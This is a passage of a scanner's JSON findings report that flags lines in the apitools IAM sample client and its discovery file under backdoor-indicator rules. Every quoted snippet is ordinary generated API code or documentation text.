          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 406,
                  "startColumn": 29,
                  "endLine": 406,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    )\n\n    def SignJwt(self, request, global_params=None):\n      r\"\"\"Signs a JWT using a service account's system-managed private key.\n\nIf no `exp` (expiry) time is contained in the claims, we will\nprovide an expiry of one hour in the future. If an expiry\n",
                    "rendered": {
                      "text": "    )\n\n    def SignJwt(self, request, global_params=None):\n      r\"\"\"Signs a JWT using a service account's system-managed private key.\n\nIf no `exp` (expiry) time is contained in the claims, we will\nprovide an expiry of one hour in the future. If an expiry\n",
                      "markdown": "`    )\n\n    def SignJwt(self, request, global_params=None):\n      r\"\"\"Signs a JWT using a service account's system-managed private key.\n\nIf no `exp` (expiry) time is contained in the claims, we will\nprovide an expiry of one hour in the future. If an expiry\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 379,
                  "startColumn": 30,
                  "endLine": 379,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    )\n\n    def SignBlob(self, request, global_params=None):\n      r\"\"\"Signs a blob using a service account's system-managed private key.\n\n      Args:\n        request: (IamProjectsServiceAccountsSignBlobRequest) input message\n",
                    "rendered": {
                      "text": "    )\n\n    def SignBlob(self, request, global_params=None):\n      r\"\"\"Signs a blob using a service account's system-managed private key.\n\n      Args:\n        request: (IamProjectsServiceAccountsSignBlobRequest) input message\n",
                      "markdown": "`    )\n\n    def SignBlob(self, request, global_params=None):\n      r\"\"\"Signs a blob using a service account's system-managed private key.\n\n      Args:\n        request: (IamProjectsServiceAccountsSignBlobRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 33,
                  "endLine": 11,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\nclass IamV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service iam version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://iam.googleapis.com/'\n",
                    "rendered": {
                      "text": "\n\nclass IamV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service iam version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://iam.googleapis.com/'\n",
                      "markdown": "`\n\nclass IamV1(base_api.BaseApiClient):\n  \"\"\"Generated client library for service iam version v1.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://iam.googleapis.com/'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 460,
                  "startColumn": 26,
                  "endLine": 460,
                  "endColumn": 79,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/{+resource}:testIamPermissions',\n        request_field='testIamPermissionsRequest',\n        request_type_name='IamProjectsServiceAccountsTestIamPermissionsRequest',\n        response_type_name='TestIamPermissionsResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/{+resource}:testIamPermissions',\n        request_field='testIamPermissionsRequest',\n        request_type_name='IamProjectsServiceAccountsTestIamPermissionsRequest',\n        response_type_name='TestIamPermissionsResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/{+resource}:testIamPermissions',\n        request_field='testIamPermissionsRequest',\n        request_type_name='IamProjectsServiceAccountsTestIamPermissionsRequest',\n        response_type_name='TestIamPermissionsResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 432,
                  "startColumn": 26,
                  "endLine": 432,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/{+name}:signJwt',\n        request_field='signJwtRequest',\n        request_type_name='IamProjectsServiceAccountsSignJwtRequest',\n        response_type_name='SignJwtResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/{+name}:signJwt',\n        request_field='signJwtRequest',\n        request_type_name='IamProjectsServiceAccountsSignJwtRequest',\n        response_type_name='SignJwtResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/{+name}:signJwt',\n        request_field='signJwtRequest',\n        request_type_name='IamProjectsServiceAccountsSignJwtRequest',\n        response_type_name='SignJwtResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 400,
                  "startColumn": 26,
                  "endLine": 400,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/{+name}:signBlob',\n        request_field='signBlobRequest',\n        request_type_name='IamProjectsServiceAccountsSignBlobRequest',\n        response_type_name='SignBlobResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/{+name}:signBlob',\n        request_field='signBlobRequest',\n        request_type_name='IamProjectsServiceAccountsSignBlobRequest',\n        response_type_name='SignBlobResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/{+name}:signBlob',\n        request_field='signBlobRequest',\n        request_type_name='IamProjectsServiceAccountsSignBlobRequest',\n        response_type_name='SignBlobResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 373,
                  "startColumn": 26,
                  "endLine": 373,
                  "endColumn": 73,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/{+resource}:setIamPolicy',\n        request_field='setIamPolicyRequest',\n        request_type_name='IamProjectsServiceAccountsSetIamPolicyRequest',\n        response_type_name='Policy',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/{+resource}:setIamPolicy',\n        request_field='setIamPolicyRequest',\n        request_type_name='IamProjectsServiceAccountsSetIamPolicyRequest',\n        response_type_name='Policy',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/{+resource}:setIamPolicy',\n        request_field='setIamPolicyRequest',\n        request_type_name='IamProjectsServiceAccountsSetIamPolicyRequest',\n        response_type_name='Policy',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 319,
                  "startColumn": 26,
                  "endLine": 319,
                  "endColumn": 73,
                  "snippet": {
                    "text": "        query_params=['options_requestedPolicyVersion'],\n        relative_path='v1/{+resource}:getIamPolicy',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsGetIamPolicyRequest',\n        response_type_name='Policy',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['options_requestedPolicyVersion'],\n        relative_path='v1/{+resource}:getIamPolicy',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsGetIamPolicyRequest',\n        response_type_name='Policy',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['options_requestedPolicyVersion'],\n        relative_path='v1/{+resource}:getIamPolicy',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsGetIamPolicyRequest',\n        response_type_name='Policy',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 200,
                  "startColumn": 26,
                  "endLine": 200,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        query_params=['keyTypes'],\n        relative_path='v1/{+name}/keys',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysListRequest',\n        response_type_name='ListServiceAccountKeysResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['keyTypes'],\n        relative_path='v1/{+name}/keys',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysListRequest',\n        response_type_name='ListServiceAccountKeysResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['keyTypes'],\n        relative_path='v1/{+name}/keys',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysListRequest',\n        response_type_name='ListServiceAccountKeysResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 173,
                  "startColumn": 26,
                  "endLine": 173,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        query_params=['publicKeyType'],\n        relative_path='v1/{+name}',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysGetRequest',\n        response_type_name='ServiceAccountKey',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['publicKeyType'],\n        relative_path='v1/{+name}',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysGetRequest',\n        response_type_name='ServiceAccountKey',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['publicKeyType'],\n        relative_path='v1/{+name}',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysGetRequest',\n        response_type_name='ServiceAccountKey',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 26,
                  "endLine": 145,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/{+name}',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysDeleteRequest',\n        response_type_name='Empty',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/{+name}',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysDeleteRequest',\n        response_type_name='Empty',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/{+name}',\n        request_field='',\n        request_type_name='IamProjectsServiceAccountsKeysDeleteRequest',\n        response_type_name='Empty',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_client.py"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 26,
                  "endLine": 118,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/{+name}/keys',\n        request_field='createServiceAccountKeyRequest',\n        request_type_name='IamProjectsServiceAccountsKeysCreateRequest',\n        response_type_name='ServiceAccountKey',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/{+name}/keys',\n        request_field='createServiceAccountKeyRequest',\n        request_type_name='IamProjectsServiceAccountsKeysCreateRequest',\n        response_type_name='ServiceAccountKey',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/{+name}/keys',\n        request_field='createServiceAccountKeyRequest',\n        request_type_name='IamProjectsServiceAccountsKeysCreateRequest',\n        response_type_name='ServiceAccountKey',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1018,
                  "startColumn": 84,
                  "endLine": 1018,
                  "endColumn": 93,
                  "snippet": {
                    "text": "rmissions\",\n              \"path\": \"v1/{+resource}:testIamPermissions\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:testIamPermissions\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Tests the specified permissions against the IAM access control policy\\nfor the specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy detail is being requested.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/dis",
                    "rendered": {
                      "text": "rmissions\",\n              \"path\": \"v1/{+resource}:testIamPermissions\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:testIamPermissions\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Tests the specified permissions against the IAM access control policy\\nfor the specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy detail is being requested.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/dis",
                      "markdown": "`rmissions\",\n              \"path\": \"v1/{+resource}:testIamPermissions\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:testIamPermissions\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Tests the specified permissions against the IAM access control policy\\nfor the specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy detail is being requested.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/dis`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 990,
                  "startColumn": 49,
                  "endLine": 990,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        \"id\": \"iam.projects.serviceAccounts.setIamPolicy\",\n              \"path\": \"v1/{+resource}:setIamPolicy\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:setIamPolicy\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Sets the IAM access control policy for the specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy is being specified.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/disks\\/*dis",
                    "rendered": {
                      "text": "        \"id\": \"iam.projects.serviceAccounts.setIamPolicy\",\n              \"path\": \"v1/{+resource}:setIamPolicy\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:setIamPolicy\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Sets the IAM access control policy for the specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy is being specified.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/disks\\/*dis",
                      "markdown": "`        \"id\": \"iam.projects.serviceAccounts.setIamPolicy\",\n              \"path\": \"v1/{+resource}:setIamPolicy\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:setIamPolicy\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Sets the IAM access control policy for the specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy is being specified.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/disks\\/*dis`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 959,
                  "startColumn": 52,
                  "endLine": 959,
                  "endColumn": 61,
                  "snippet": {
                    "text": "     \"id\": \"iam.projects.serviceAccounts.getIamPolicy\",\n              \"path\": \"v1/{+resource}:getIamPolicy\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:getIamPolicy\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Returns the IAM access control policy for specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy is being requested.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/disks\\/*disk*`.",
                    "rendered": {
                      "text": "     \"id\": \"iam.projects.serviceAccounts.getIamPolicy\",\n              \"path\": \"v1/{+resource}:getIamPolicy\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:getIamPolicy\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Returns the IAM access control policy for specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy is being requested.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/disks\\/*disk*`.",
                      "markdown": "`     \"id\": \"iam.projects.serviceAccounts.getIamPolicy\",\n              \"path\": \"v1/{+resource}:getIamPolicy\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:getIamPolicy\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Returns the IAM access control policy for specified IAM resource.\",\n              \"parameters\": {\n                \"resource\": {\n                  \"description\": \"REQUIRED: The resource for which the policy is being requested.\\n`resource` is usually specified as a path, such as\\n`projects\\/*project*\\/zones\\/*zone*\\/disks\\/*disk*`.`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 451,
                  "startColumn": 129,
                  "endLine": 451,
                  "endColumn": 133,
                  "snippet": {
                    "text": "          ]\n        },\n        \"in\": {\n          \"description\": \"If one or more 'in' clauses are specified, the rule matches if\\nthe PRINCIPAL\\/AUTHORITY_SELECTOR is in at least one of these entries.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          ]\n        },\n        \"in\": {\n          \"description\": \"If one or more 'in' clauses are specified, the rule matches if\\nthe PRINCIPAL\\/AUTHORITY_SELECTOR is in at least one of these entries.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                      "markdown": "`          ]\n        },\n        \"in\": {\n          \"description\": \"If one or more 'in' clauses are specified, the rule matches if\\nthe PRINCIPAL\\/AUTHORITY_SELECTOR is in at least one of these entries.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 368,
                  "startColumn": 67,
                  "endLine": 368,
                  "endColumn": 76,
                  "snippet": {
                    "text": " be applied if one or more matching rule requires logging.\\n- Otherwise, if no rule applies, permission is denied.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Rule\"\n          }\n        },\n        \"etag\": {\n          \"description\": \"`etag` is used for optimistic concurrency control as a way to help\\nprevent simultaneous updates of a policy from overwriting each other.\\nIt is strongly suggested that systems make use of the `etag` in the\\nread-modify-write cycle to perform policy updates in order to avoid race\\nconditions: An `etag` is returned in the response to `getIamPolicy`,",
                    "rendered": {
                      "text": " be applied if one or more matching rule requires logging.\\n- Otherwise, if no rule applies, permission is denied.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Rule\"\n          }\n        },\n        \"etag\": {\n          \"description\": \"`etag` is used for optimistic concurrency control as a way to help\\nprevent simultaneous updates of a policy from overwriting each other.\\nIt is strongly suggested that systems make use of the `etag` in the\\nread-modify-write cycle to perform policy updates in order to avoid race\\nconditions: An `etag` is returned in the response to `getIamPolicy`,",
                      "markdown": "` be applied if one or more matching rule requires logging.\\n- Otherwise, if no rule applies, permission is denied.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Rule\"\n          }\n        },\n        \"etag\": {\n          \"description\": \"`etag` is used for optimistic concurrency control as a way to help\\nprevent simultaneous updates of a policy from overwriting each other.\\nIt is strongly suggested that systems make use of the `etag` in the\\nread-modify-write cycle to perform policy updates in order to avoid race\\nconditions: An `etag` is returned in the response to `getIamPolicy`,`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 338,
                  "startColumn": 107,
                  "endLine": 338,
                  "endColumn": 116,
                  "snippet": {
                    "text": "        \"type\": \"string\"\n        },\n        \"signedJwt\": {\n          \"description\": \"The signed JWT.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"Policy\": {\n      \"id\": \"Policy\",\n      \"description\": \"Defines an Identity and Access Management (IAM) policy. It is used to\\nspecify access control policies for Cloud Platform resources.\\n\\n\\nA `Policy` consists of a list of `bindings`. A `Binding` binds a list of\\n`members` to a `role`, where the members can be user accounts, Google groups,\\nGoogle domains, and service accounts. A `role` is a named list of permissions\\ndefined by IAM.\\n\\n**Exa",
                    "rendered": {
                      "text": "        \"type\": \"string\"\n        },\n        \"signedJwt\": {\n          \"description\": \"The signed JWT.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"Policy\": {\n      \"id\": \"Policy\",\n      \"description\": \"Defines an Identity and Access Management (IAM) policy. It is used to\\nspecify access control policies for Cloud Platform resources.\\n\\n\\nA `Policy` consists of a list of `bindings`. A `Binding` binds a list of\\n`members` to a `role`, where the members can be user accounts, Google groups,\\nGoogle domains, and service accounts. A `role` is a named list of permissions\\ndefined by IAM.\\n\\n**Exa",
                      "markdown": "`        \"type\": \"string\"\n        },\n        \"signedJwt\": {\n          \"description\": \"The signed JWT.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"Policy\": {\n      \"id\": \"Policy\",\n      \"description\": \"Defines an Identity and Access Management (IAM) policy. It is used to\\nspecify access control policies for Cloud Platform resources.\\n\\n\\nA `Policy` consists of a list of `bindings`. A `Binding` binds a list of\\n`members` to a `role`, where the members can be user accounts, Google groups,\\nGoogle domains, and service accounts. A `role` is a named list of permissions\\ndefined by IAM.\\n\\n**Exa`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 640,
                  "endLine": 218,
                  "endColumn": 644,
                  "snippet": {
                    "text": "of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for all service accounts are also published at the OAuth2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n ",
                    "rendered": {
                      "text": "of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for all service accounts are also published at the OAuth2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n ",
